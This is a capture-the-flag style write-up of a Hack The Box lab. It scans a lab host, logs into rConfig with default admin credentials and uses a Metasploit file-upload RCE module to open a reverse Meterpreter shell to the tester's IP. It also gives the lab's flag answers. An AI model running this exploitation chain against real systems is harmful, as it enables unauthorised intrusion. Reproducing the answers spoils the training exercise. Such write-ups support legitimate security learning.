### HTB Pentester Path <br>
### Shells & Payloads - Infiltrating Linux Lab <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>

---

IP:
10.129.201.101

---
### Question 1:
What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?

&#x1F6A9; **php**.

---

### Question 2:
Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file at the root of the file system.


Let me pop off, come home from the club sloppy drunk and get my rocks off. J/K fire up nmap:

	$ sudo nmap -sT -sC -sV -F -A -v 10.129.201.101

	PORT     STATE SERVICE  VERSION
	21/tcp   open  ftp      vsftpd 2.0.8 or later
	22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
	|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
	|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
	80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
	|_http-favicon: Unknown favicon MD5: 52D936993020A4A4BF686DB0EED64D5A
	|_http-title: Did not follow redirect to https://10.129.201.101/
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	111/tcp  open  rpcbind  2-4 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100000  3,4          111/tcp6  rpcbind
	|_  100000  3,4          111/udp6  rpcbind
	443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
	|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
	| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
	| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2021-09-24T19:29:26
	| Not valid after:  2022-09-24T19:29:26
	| MD5:   5ada:149a:0aea:3e88:fc92:fbe5:6b3b:75e0
	|_SHA-1: 42d1:d691:122c:4c03:f7b5:a15b:8a4a:ed54:e88c:c76d
	|_http-favicon: Unknown favicon MD5: 52D936993020A4A4BF686DB0EED64D5A
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_ssl-date: TLS randomness does not represent time
	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
	3306/tcp open  mysql    MySQL (unauthorized)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


rconfig is running on port 80. I actually got into the dashboard by auth'ing admin:admin, derp...but didnt see any devices listed. So lets use MSF:

	$ msfconsole


	[msf](Jobs:0 Agents:0) search rconfig

	Matching Modules
	================
	
	   #   Name                                                     Disclosure Date  Rank       Check  Description
	   -   ----                                                     ---------------  ----       -----  -----------
	   0   exploit/multi/http/solr_velocity_rce                     2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
	   1     \_ target: Java (in-memory)                            .                .          .      .
	   2     \_ target: Unix (in-memory)                            .                .          .      .
	   3     \_ target: Linux (dropper)                             .                .          .      .
	   4     \_ target: x86/x64 Windows PowerShell                  .                .          .      .
	   5     \_ target: x86/x64 Windows CmdStager                   .                .          .      .
	   6     \_ target: Windows Exec                                .                .          .      .
	   7   auxiliary/gather/nuuo_cms_file_download                  2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
	   8   exploit/linux/http/rconfig_ajaxarchivefiles_rce          2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
	   9   exploit/linux/http/rconfig_vendors_auth_file_upload_rce  2021-03-17       excellent  Yes    rConfig Vendors Auth File Upload RCE
	   10  exploit/unix/webapp/rconfig_install_cmd_exec             2019-10-28       excellent  Yes    rConfig install Command Execution
	   11    \_ target: Automatic (Unix In-Memory)                  .                .          .      .
	   12    \_ target: Automatic (Linux Dropper)                   .                .          . 

	[msf](Jobs:0 Agents:0) >> use 9
	[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
	
OoOooO rconfigvendors_auth_file_upload_rce? remote code exec sounds like a problem for some computer that isn't ours.
Now lets set the appropriate options:

	[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> show options
	
	Module options (exploit/linux/http/rconfig_vendors_auth_file_upload_rce):
	
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   PASSWORD   admin            yes       Password of the admin account
	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
	   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT      443              yes       The target port (TCP)
	   SSL        true             no        Negotiate SSL/TLS for outgoing connections
	   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
	   TARGETURI  /                yes       The base path of the rConfig server
	   URIPATH                     no        The URI to use for this exploit (default is random)
	   USERNAME   admin            yes       Username of the admin account
	   VHOST                       no        HTTP server virtual host
	
	
	   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to li
	                                       sten on all addresses.
	   SRVPORT  8080             yes       The local port to listen on.
	
	
	Payload options (php/meterpreter/reverse_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LHOST  85.9.198.239     yes       The listen address (an interface may be specified)
	   LPORT  4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   rConfig <= 3.9.6
	
	
	
	View the full module info with the info, or info -d command.
	
	[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set rhost 10.129.201.101

	[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set lhost 10.10.14.11
	lhost => 10.10.14.11

Anddddd exploit your little heart out:

	[msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> exploit
	[*] Started reverse TCP handler on 10.10.14.11:4444 
	[*] Running automatic check ("set AutoCheck false" to disable)
	[+] 3.9.6 of rConfig found !
	[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
	[+] We successfully logged in !
	[*] Uploading file 'isvtzcqlug.php' containing the payload...
	[*] Triggering the payload ...
	[*] Sending stage (40004 bytes) to 10.129.201.101
	[+] Deleted isvtzcqlug.php
	[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.129.201.101:55478) at 2025-09-22 20:09:54 -0500

Didnt need to upgrade shell to tty, session was stable.
So I just traversed the fileystem to look for said file in root dir:

	(Meterpreter 1)(/home/rconfig/www/images/vendor) > ls
	Listing: /home/rconfig/www/images/vendor
	========================================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100644/rw-r--r--  673   fil   2020-09-03 04:49:58 -0500  ajax-loader.gif
	100644/rw-r--r--  1027  fil   2020-09-03 04:49:58 -0500  cisco.jpg
	100644/rw-r--r--  1113  fil   2025-09-22 20:05:29 -0500  cnyjpykkea.php
	100644/rw-r--r--  1017  fil   2020-09-03 04:49:58 -0500  juniper.jpg
	100644/rw-r--r--  1113  fil   2025-09-22 20:00:50 -0500  otnciqlvl.php
	
	(Meterpreter 1)(/home/rconfig/www/images/vendor) > cd ../../../
	(Meterpreter 1)(/home/rconfig) > cd ../../
	(Meterpreter 1)(/) > ls
	Listing: /
	==========
	
	Mode              Size   Type  Last modified              Name
	----              ----   ----  -------------              ----
	040555/r-xr-xr-x  53248  dir   2021-09-24 14:37:06 -0500  bin
	040555/r-xr-xr-x  4096   dir   2021-09-24 14:42:55 -0500  boot
	040755/rwxr-xr-x  3120   dir   2025-09-22 19:03:59 -0500  dev
	040755/rwxr-xr-x  56     dir   2021-10-18 16:28:04 -0500  devicedetails
	040755/rwxr-xr-x  8192   dir   2025-09-22 19:04:00 -0500  etc
	040755/rwxr-xr-x  84     dir   2021-09-24 14:44:24 -0500  home
	040555/r-xr-xr-x  4096   dir   2021-09-24 14:35:08 -0500  lib
	040555/r-xr-xr-x  86016  dir   2021-09-24 14:37:11 -0500  lib64
	040755/rwxr-xr-x  6      dir   2018-04-10 23:59:55 -0500  media
	040755/rwxr-xr-x  6      dir   2018-04-10 23:59:55 -0500  mnt
	040755/rwxr-xr-x  16     dir   2021-09-24 14:17:05 -0500  opt
	040555/r-xr-xr-x  0      dir   2025-09-22 19:03:51 -0500  proc
	040550/r-xr-x---  278    dir   2021-10-18 20:31:55 -0500  root
	040755/rwxr-xr-x  1300   dir   2025-09-22 19:04:08 -0500  run
	040555/r-xr-xr-x  20480  dir   2021-09-24 14:35:18 -0500  sbin
	040755/rwxr-xr-x  6      dir   2018-04-10 23:59:55 -0500  srv
	040555/r-xr-xr-x  0      dir   2025-09-22 19:03:52 -0500  sys
	041777/rwxrwxrwx  6      dir   2025-09-22 20:25:33 -0500  tmp
	040755/rwxr-xr-x  155    dir   2021-09-24 14:13:04 -0500  usr
	040755/rwxr-xr-x  4096   dir   2021-09-24 14:29:26 -0500  var
	
	(Meterpreter 1)(/) > cd device details
	[-] stdapi_fs_chdir: Operation failed: 1
	(Meterpreter 1)(/) > cd devicedetails
	(Meterpreter 1)(/devicedetails) > ls
	Listing: /devicedetails
	=======================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100644/rw-r--r--  568   fil   2021-10-18 16:23:40 -0500  edgerouter-isp.yml
	100644/rw-r--r--  179   fil   2021-10-18 16:28:03 -0500  hostnameinfo.txt
	
	(Meterpreter 1)(/devicedetails) > cat hostnameinfo.txt
	Note: 
	
	All yaml (.yml) files should be named after the hostname of the router or switch they will configure. We discussed this in our meeting back in January. Ask Bob about it. 

&#x1F6A9; found file **edger--edit--outer-isp**.yml
